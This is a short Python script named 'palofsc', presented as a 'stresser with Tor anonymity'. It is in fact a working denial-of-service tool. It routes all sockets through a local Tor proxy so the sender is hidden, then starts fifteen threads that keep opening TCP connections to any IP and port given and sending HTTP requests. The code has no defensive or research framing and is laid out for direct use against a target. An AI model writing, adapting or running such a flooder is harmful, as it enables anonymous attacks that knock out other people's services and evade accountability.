import socket
import threading
import argparse
import sys
import socks
import signal

# palofsc: Integrated stresser with Tor anonymity (iSH compatible)
# Requirements: 'apk add tor' and ensure Tor service is running.
# Use: python3 end.py <IP> <PORT>

def configure_tor():
    """Configures socket to route traffic through local Tor proxy."""
    socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
    socket.socket = socks.socksocket

def stress_target(ip, port):
    """Execution loop for network load."""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, int(port)))
            s.send(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
            s.close()
        except:
            continue

def run_gui_interface():
    """
    Console-based interactive menu for iSH. 
    GUI libraries like Tkinter are non-native to iSH and highly unstable.
    """
    print("--- iSH Multi-Tool Interface ---")
    print("1. Target Setup")
    print("2. Launch Stressor")
    print("3. Status Monitor")
    choice = input("Select option: ")
    return choice

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("ip")
    parser.add_argument("port")
    args = parser.parse_args()

    print("[*] Initializing Tor anonymity...")
    configure_tor()
    
    print("[*] Launching threads...")
    for _ in range(15):
        threading.Thread(target=stress_target, args=(args.ip, args.port), daemon=True).start()
    
    input("Press Enter to kill processes.\n")
